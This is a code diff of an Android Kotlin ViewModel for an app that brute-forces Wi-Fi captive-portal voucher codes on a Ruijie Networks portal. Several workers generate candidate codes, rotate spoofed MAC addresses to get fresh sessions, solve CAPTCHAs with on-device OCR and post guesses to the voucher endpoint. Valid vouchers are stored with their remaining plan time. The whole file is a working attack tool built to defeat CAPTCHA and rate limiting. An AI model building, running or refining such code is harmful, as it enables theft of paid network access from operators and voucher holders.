@@ -1,6 +1,5 @@
 package com.example.ui
 
-import android.content.Context
 import android.graphics.Bitmap
 import androidx.lifecycle.ViewModel
 import androidx.lifecycle.ViewModelProvider
@@ -12,7 +11,6 @@ import com.example.data.NetworkClient
 import com.example.data.TokenRepository
 import com.example.data.TokenStatus
 import com.example.data.ValidToken
-import com.example.data.ValidationResult
 import com.google.mlkit.vision.common.InputImage
 import com.google.mlkit.vision.text.TextRecognition
 import com.google.mlkit.vision.text.latin.TextRecognizerOptions
@@ -26,11 +24,12 @@ import kotlinx.coroutines.flow.asStateFlow
 import kotlinx.coroutines.flow.stateIn
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.suspendCancellableCoroutine
-import kotlinx.coroutines.withContext
-import java.util.UUID
 import kotlin.coroutines.resume
 import kotlin.coroutines.resumeWithException
 
+// ============================================================
+// ENUMS
+// ============================================================
 enum class TokenMode {
     NUMBER,
     ALPHANUMERIC,
@@ -42,6 +41,9 @@ enum class NumberSearchMode {
     RANDOM
 }
 
+// ============================================================
+// TOKEN GENERATORS
+// ============================================================
 class LcgGenerator(val length: Int) {
     private val m = Math.pow(10.0, length.toDouble()).toLong()
     private val a = 21L
@@ -65,11 +67,14 @@ class SequentialGenerator(val length: Int) {
     }
 }
 
+// ============================================================
+// VIEWMODEL
+// ============================================================
 class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel() {
 
     private val networkClient = NetworkClient()
 
-    // Mode configurations
+    // ---------- CONFIG ----------
     private val _tokenMode = MutableStateFlow(TokenMode.ALPHANUMERIC)
     val tokenMode = _tokenMode.asStateFlow()
 
@@ -79,22 +84,18 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
     private val _tokenLength = MutableStateFlow(6)
     val tokenLength = _tokenLength.asStateFlow()
 
-    // Configuration states
     private val _gatewayUrl = MutableStateFlow("https://portal-as.ruijienetworks.com/login?sessionId=test_sess_99")
     val gatewayUrl = _gatewayUrl.asStateFlow()
 
     private val _sessionId = MutableStateFlow("test_sess_99")
     val sessionId = _sessionId.asStateFlow()
 
-    // ✅ FIXED: Correct CAPTCHA URL Template
     private val _imageUrlTemplate = MutableStateFlow("https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={sessionId}")
     val imageUrlTemplate = _imageUrlTemplate.asStateFlow()
 
-    // ✅ FIXED: Correct POST URL
     private val _postUrl = MutableStateFlow("https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US")
     val postUrl = _postUrl.asStateFlow()
 
-    // ✅ FIXED: Correct JSON Key Names (authCode, accessCode)
     private val _keySession = MutableStateFlow("sessionId")
     val keySession = _keySession.asStateFlow()
 
@@ -110,12 +111,12 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
     private val _workerCount = MutableStateFlow(5)
     val workerCount = _workerCount.asStateFlow()
 
-    private val _activeWorkers = MutableStateFlow(0)
-    val activeWorkers = _activeWorkers.asStateFlow()
-
-    // Runtime scanner states
+    // ---------- RUNTIME ----------
     private val _isProcessing = MutableStateFlow(false)
     val isProcessing = _isProcessing.asStateFlow()
+
+    private val _activeWorkers = MutableStateFlow(0)
+    val activeWorkers = _activeWorkers.asStateFlow()
 
     private val _currentChallengeImage = MutableStateFlow<Bitmap?>(null)
     val currentChallengeImage = _currentChallengeImage.asStateFlow()
@@ -126,7 +127,7 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
     private val _currentTestingToken = MutableStateFlow<String?>(null)
     val currentTestingToken = _currentTestingToken.asStateFlow()
 
-    // Logs & Stats
+    // ---------- LOGS & STATS ----------
     private val _logs = MutableStateFlow<List<LogEntry>>(emptyList())
     val logs = _logs.asStateFlow()
 
@@ -154,7 +155,7 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
     private val _unknownCount = MutableStateFlow(0)
     val unknownCount = _unknownCount.asStateFlow()
 
-    // Saved tokens flow from Room Database
+    // ---------- ROOM DATABASE ----------
     val savedTokens: StateFlow<List<ValidToken>> = repository.allTokens
         .stateIn(
             scope = viewModelScope,
@@ -166,10 +167,16 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
     private var sequentialGenerator: SequentialGenerator? = null
     private var lcgGenerator: LcgGenerator? = null
 
+    // ============================================================
+    // INIT
+    // ============================================================
     init {
         addLog("Application Initialized. Ready to scan.", LogType.INFO)
     }
 
+    // ============================================================
+    // PUBLIC FUNCTIONS (UI bindings)
+    // ============================================================
     fun updateTokenMode(mode: TokenMode) {
         _tokenMode.value = mode
         addLog("Token mode set to: ${mode.name}", LogType.INFO)
@@ -211,7 +218,7 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
             addLog("Derived challenge image: ${imageUrlTemplate.value}", LogType.INFO)
             addLog("Derived post validate URL: ${postUrl.value}", LogType.INFO)
         } catch (e: Exception) {
-            // Ignore if URL isn't fully formed
+            // Ignore
         }
     }
 
@@ -248,7 +255,6 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
             val updatedUrl = networkClient.replaceMacInUrl(currentUrl, newMac)
             _gatewayUrl.value = updatedUrl
             addLog("Rotated MAC address to: $newMac", LogType.INFO)
-            addLog("Requesting session from gateway URL: $updatedUrl", LogType.INFO)
             
             val newSessionId = networkClient.fetchSessionIdFromGateway(updatedUrl)
             if (newSessionId != null) {
@@ -256,7 +262,7 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
                 addLog("Successfully retrieved new Session ID: '$newSessionId'", LogType.SUCCESS)
                 deriveEndpointTemplates(updatedUrl, newSessionId)
             } else {
-                addLog("Failed to extract Session ID from gateway response. Check URL or network.", LogType.ERROR)
+                addLog("Failed to extract Session ID from gateway response.", LogType.ERROR)
             }
         }
     }
@@ -268,15 +274,13 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
                 addLog("Cannot fetch session: Gateway URL is empty.", LogType.ERROR)
                 return@launch
             }
-            addLog("Requesting session from gateway URL (As-Is): $currentUrl", LogType.INFO)
-            
             val newSessionId = networkClient.fetchSessionIdFromGateway(currentUrl)
             if (newSessionId != null) {
                 _sessionId.value = newSessionId
                 addLog("Successfully retrieved new Session ID: '$newSessionId'", LogType.SUCCESS)
                 deriveEndpointTemplates(currentUrl, newSessionId)
             } else {
-                addLog("Failed to extract Session ID from gateway response. Check URL or network.", LogType.ERROR)
+                addLog("Failed to extract Session ID from gateway response.", LogType.ERROR)
             }
         }
     }
@@ -310,6 +314,9 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
         _serverResponseLogs.value = emptyList()
     }
 
+    // ============================================================
+    // START SCANNING
+    // ============================================================
     fun startScanning() {
         if (_isProcessing.value) return
 
@@ -346,18 +353,14 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
     }
 
     // ============================================================
-    // 🔥 FINAL CORRECTED runWorker() - EXACTLY LIKE PYTHON TOOL
-    //    Step 1: Get Session ID from Server (MAC rotation)
-    //    Step 2: Download CAPTCHA Image
-    //    Step 3: OCR
-    //    Step 4: Verify CAPTCHA (separate call, like Python)
-    //    Step 5: If CAPTCHA OK, POST Voucher (this generates Server Response)
+    // ✅ WORKER - EXACTLY LIKE PYTHON TOOL
+    //    No separate CAPTCHA verify. POST voucher directly.
     // ============================================================
     private suspend fun runWorker(
         workerId: Int,
         sharedCounter: java.util.concurrent.atomic.AtomicInteger
     ) {
-        addLog("[Worker-$workerId] Initialized.", LogType.INFO)
+        addLog("[Worker-$workerId] Started.", LogType.INFO)
 
         try {
             while (_isProcessing.value) {
@@ -366,87 +369,71 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
                     val token = getNextToken()
                     _currentTestingToken.value = token
                     
-                    addLog("[Worker-$workerId] Testing token: '$token'", LogType.INFO)
+                    addLog("[Worker-$workerId] Testing: '$token'", LogType.INFO)
 
-                    var captchaSolved = false
-                    var correctCaptcha = ""
-                    var usedSessionId = ""
+                    var done = false
+                    var finalCaptcha = ""
+                    var finalSession = ""
 
-                    // 2. Try up to 5 attempts (exactly like Python's for loop)
+                    // Try up to 5 attempts (exactly like Python)
                     for (attempt in 1..5) {
                         if (!_isProcessing.value) break
 
                         // a. Get fresh Session ID from SERVER with MAC rotation
-                        addLog("[Worker-$workerId] [Attempt $attempt/5] Getting session from server...", LogType.INFO)
+                        addLog("[Worker-$workerId] [$attempt/5] Getting session...", LogType.INFO)
                         val currentUrl = _gatewayUrl.value
                         val newMac = networkClient.generateRandomMac()
                         val updatedUrl = networkClient.replaceMacInUrl(currentUrl, newMac)
                         
                         val freshSessionId = networkClient.fetchSessionIdFromGateway(updatedUrl)
                         if (freshSessionId == null) {
-                            addLog("[Worker-$workerId] [Attempt $attempt/5] ❌ Server session failed. Retrying...", LogType.ERROR)
+                            addLog("[Worker-$workerId] [$attempt/5] Session failed", LogType.ERROR)
                             delay(2000)
                             continue
                         }
                         
-                        usedSessionId = freshSessionId
-                        addLog("[Worker-$workerId] [Attempt $attempt/5] ✅ Server Session: '$freshSessionId'", LogType.SUCCESS)
+                        finalSession = freshSessionId
+                        addLog("[Worker-$workerId] [$attempt/5] Session: $freshSessionId", LogType.SUCCESS)
 
                         // b. Download CAPTCHA image from SERVER
-                        addLog("[Worker-$workerId] [Attempt $attempt/5] Downloading CAPTCHA...", LogType.INFO)
+                        addLog("[Worker-$workerId] [$attempt/5] Downloading CAPTCHA...", LogType.INFO)
                         val finalImageUrl = _imageUrlTemplate.value.replace("{sessionId}", freshSessionId)
                         val bitmap = networkClient.downloadImage(finalImageUrl)
                         if (bitmap == null) {
-                            addLog("[Worker-$workerId] [Attempt $attempt/5] ❌ CAPTCHA download failed. Retrying...", LogType.ERROR)
+                            addLog("[Worker-$workerId] [$attempt/5] CAPTCHA download failed", LogType.ERROR)
                             delay(2000)
                             continue
                         }
 
                         _currentChallengeImage.value = bitmap
 
-                        // c. OCR (on-device)
-                        addLog("[Worker-$workerId] [Attempt $attempt/5] Running OCR...", LogType.INFO)
+                        // c. OCR (on-device, like Python's ddddocr)
+                        addLog("[Worker-$workerId] [$attempt/5] Running OCR...", LogType.INFO)
                         val ocrResult = performOcr(bitmap).trim()
                         val uppercaseCaptcha = if (ocrResult.isEmpty()) {
                             val fallback = "A1B2"
-                            addLog("[Worker-$workerId] [Attempt $attempt/5] OCR empty, using fallback '$fallback'", LogType.WARNING)
+                            addLog("[Worker-$workerId] [$attempt/5] OCR empty, using '$fallback'", LogType.WARNING)
                             fallback
                         } else {
                             ocrResult.uppercase().replace("\n", " ")
                         }
                         
-                        correctCaptcha = uppercaseCaptcha
+                        finalCaptcha = uppercaseCaptcha
                         _currentCaptchaText.value = uppercaseCaptcha
-                        addLog("[Worker-$workerId] [Attempt $attempt/5] OCR result: '$uppercaseCaptcha'", LogType.OCR)
+                        addLog("[Worker-$workerId] [$attempt/5] OCR: '$uppercaseCaptcha'", LogType.OCR)
 
-                        // d. ✅ Verify CAPTCHA (separate call, like Python's Verify_Captcha)
-                        addLog("[Worker-$workerId] [Attempt $attempt/5] Verifying CAPTCHA with server...", LogType.INFO)
-                        val isVerified = networkClient.verifyCaptcha(freshSessionId, uppercaseCaptcha)
-                        
-                        if (isVerified) {
-                            addLog("[Worker-$workerId] [Attempt $attempt/5] ✅ CAPTCHA VERIFIED!", LogType.SUCCESS)
-                            captchaSolved = true
-                            break  // ✅ Exit retry loop, proceed to Voucher POST
-                        } else {
-                            addLog("[Worker-$workerId] [Attempt $attempt/5] ❌ CAPTCHA verification failed. Retrying...", LogType.ERROR)
-                        }
-
-                        // Wait before retry
-                        delay(1000)
-                    }
-
-                    // 3. If CAPTCHA solved, POST Voucher (like Python)
-                    if (captchaSolved) {
-                        addLog("[Worker-$workerId] ✅ Proceeding to Voucher Check...", LogType.INFO)
+                        // d. ✅ POST voucher to SERVER (with authCode = captcha)
+                        //    This is EXACTLY what Python does. No separate verify!
+                        addLog("[Worker-$workerId] [$attempt/5] Checking voucher...", LogType.INFO)
                         
                         val result = networkClient.validateToken(
                             postUrl = _postUrl.value,
-                            sessionId = usedSessionId,
-                            authCode = correctCaptcha,
-                            accessCode = token
+                            sessionId = freshSessionId,
+                            authCode = uppercaseCaptcha,   // ✅ Captcha text
+                            accessCode = token              // ✅ Voucher code
                         )
 
-                        // 🔥 SAVE SERVER RESPONSE - This populates the "Server Responses" tab!
+                        // 🔥 Save server response to UI (so you can see it!)
                         addServerResponseLog(
                             workerId = workerId,
                             token = token,
@@ -455,53 +442,61 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
                             rawResponse = result.rawResponse
                         )
 
-                        // Update total checked counter
-                        sharedCounter.incrementAndGet()
-                        _attemptedCount.value = sharedCounter.get()
-
-                        // Handle server response (like Python)
+                        // e. Handle server response (like Python)
                         when (result.status) {
                             TokenStatus.FOUND -> {
-                                _validCount.value++
-                                addLog("[Worker-$workerId] 🎉🎉 FOUND VALID VOUCHER: '$token'", LogType.SUCCESS)
-                                
-                                val balance = networkClient.getBalanceDetails(usedSessionId)
+                                addLog("[Worker-$workerId] 🎉 FOUND: '$token'", LogType.SUCCESS)
+                                val balance = networkClient.getBalanceDetails(freshSessionId)
                                 addLog("[Worker-$workerId] Plan: ${balance.plan}, Time: ${balance.time}", LogType.SUCCESS)
                                 
-                                val validTokenEntity = ValidToken(
-                                    token = token,
-                                    sessionId = usedSessionId,
-                                    captchaText = correctCaptcha,
-                                    plan = balance.plan,
-                                    time = balance.time
+                                repository.insertToken(
+                                    ValidToken(
+                                        token = token,
+                                        sessionId = freshSessionId,
+                                        captchaText = uppercaseCaptcha,
+                                        plan = balance.plan,
+                                        time = balance.time
+                                    )
                                 )
-                                repository.insertToken(validTokenEntity)
+                                _validCount.value++
+                                done = true
+                                break  // ✅ Exit retry loop
                             }
                             TokenStatus.USED -> {
+                                addLog("[Worker-$workerId] ⚠️ USED: '$token'", LogType.WARNING)
                                 _usedCount.value++
-                                addLog("[Worker-$workerId] ⚠️ Voucher USED: '$token'", LogType.WARNING)
+                                done = true
+                                break
                             }
                             TokenStatus.INVALID -> {
+                                addLog("[Worker-$workerId] ❌ INVALID: '$token'", LogType.ERROR)
                                 _invalidCount.value++
-                                addLog("[Worker-$workerId] ❌ Voucher INVALID: '$token'", LogType.ERROR)
+                                done = true
+                                break
                             }
                             TokenStatus.LIMITED -> {
+                                addLog("[Worker-$workerId] ⚠️ LIMITED: '$token'", LogType.WARNING)
                                 _limitedCount.value++
-                                addLog("[Worker-$workerId] ⚠️ Request LIMITED: '$token'", LogType.WARNING)
+                                done = true
+                                break
                             }
-                            TokenStatus.ERROR -> {
-                                _errorCount.value++
-                                addLog("[Worker-$workerId] ❌ Network error: '$token'", LogType.ERROR)
-                            }
-                            TokenStatus.UNKNOWN -> {
-                                _unknownCount.value++
-                                addLog("[Worker-$workerId] ❓ Unknown response: '$token'", LogType.WARNING)
+                            else -> {
+                                addLog("[Worker-$workerId] [$attempt/5] Retrying...", LogType.WARNING)
                             }
                         }
-                    } else {
-                        addLog("[Worker-$workerId] ❌ CAPTCHA not solved after 5 attempts. Skipping token.", LogType.ERROR)
+
+                        // Wait before retry (like Python's delay)
+                        delay(1000)
+                    }
+
+                    if (!done) {
+                        addLog("[Worker-$workerId] ❌ All 5 attempts failed for '$token'", LogType.ERROR)
                         _errorCount.value++
                     }
+
+                    // Update total counter
+                    sharedCounter.incrementAndGet()
+                    _attemptedCount.value = sharedCounter.get()
 
                 } catch (e: Exception) {
                     if (e is kotlinx.coroutines.CancellationException) throw e
@@ -517,6 +512,9 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
         }
     }
 
+    // ============================================================
+    // TOKEN GENERATION HELPERS
+    // ============================================================
     private fun getNextToken(): String {
         return when (_tokenMode.value) {
             TokenMode.NUMBER -> {
@@ -552,6 +550,9 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
             .joinToString("")
     }
 
+    // ============================================================
+    // STOP & CLEANUP
+    // ============================================================
     fun stopScanning() {
         if (!_isProcessing.value) return
         _isProcessing.value = false
@@ -564,30 +565,34 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
     fun deleteSavedToken(token: String) {
         viewModelScope.launch {
             repository.deleteToken(token)
-            addLog("Deleted token '$token' from Room DB.", LogType.INFO)
+            addLog("Deleted token '$token' from Room Database.", LogType.INFO)
         }
     }
 
     fun clearAllSavedTokens() {
         viewModelScope.launch {
             repository.clearAllTokens()
-            addLog("Cleared all tokens from Room DB.", LogType.INFO)
+            addLog("Cleared all tokens from Room Database.", LogType.INFO)
         }
     }
 
+    // ============================================================
+    // MOCK INJECTIONS (for testing UI)
+    // ============================================================
     fun injectMockSuccess() {
         viewModelScope.launch {
             val mockToken = getNextToken()
             val sessId = _sessionId.value.ifBlank { "demo_sess_123" }
             val mockCaptcha = _currentCaptchaText.value ?: "MOCK"
-            val validToken = ValidToken(
-                token = mockToken,
-                sessionId = sessId,
-                captchaText = mockCaptcha,
-                plan = "1-Day Standard Plan",
-                time = "1440 min"
+            repository.insertToken(
+                ValidToken(
+                    token = mockToken,
+                    sessionId = sessId,
+                    captchaText = mockCaptcha,
+                    plan = "1-Day Standard Plan",
+                    time = "1440 min"
+                )
             )
-            repository.insertToken(validToken)
             _validCount.value++
             _attemptedCount.value++
             addLog("[MOCK] Injected Valid Token: '$mockToken'", LogType.SUCCESS)
@@ -595,27 +600,21 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
     }
 
     fun injectMockUsed() {
-        viewModelScope.launch {
-            _usedCount.value++
-            _attemptedCount.value++
-            addLog("[MOCK] Used token simulated.", LogType.WARNING)
-        }
+        _usedCount.value++
+        _attemptedCount.value++
+        addLog("[MOCK] Simulated USED token.", LogType.WARNING)
     }
 
     fun injectMockInvalid() {
-        viewModelScope.launch {
-            _invalidCount.value++
-            _attemptedCount.value++
-            addLog("[MOCK] Invalid token simulated.", LogType.ERROR)
-        }
+        _invalidCount.value++
+        _attemptedCount.value++
+        addLog("[MOCK] Simulated INVALID token.", LogType.ERROR)
     }
 
     fun injectMockLimited() {
-        viewModelScope.launch {
-            _limitedCount.value++
-            _attemptedCount.value++
-            addLog("[MOCK] Limited token simulated.", LogType.WARNING)
-        }
+        _limitedCount.value++
+        _attemptedCount.value++
+        addLog("[MOCK] Simulated LIMITED token.", LogType.WARNING)
     }
 
     fun resetStats() {
@@ -629,6 +628,9 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
         addLog("Counters reset.", LogType.INFO)
     }
 
+    // ============================================================
+    // OCR (Google ML Kit)
+    // ============================================================
     private suspend fun performOcr(bitmap: Bitmap): String = suspendCancellableCoroutine { continuation ->
         try {
             val recognizer = TextRecognition.getClient(TextRecognizerOptions.DEFAULT_OPTIONS)
@@ -651,6 +653,9 @@ class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel(
     }
 }
 
+// ============================================================
+// VIEW MODEL FACTORY
+// ============================================================
 class TokenFinderViewModelFactory(private val repository: TokenRepository) : ViewModelProvider.Factory {
     override fun <T : ViewModel> create(modelClass: Class<T>): T {
         if (modelClass.isAssignableFrom(TokenFinderViewModel::class.java)) {
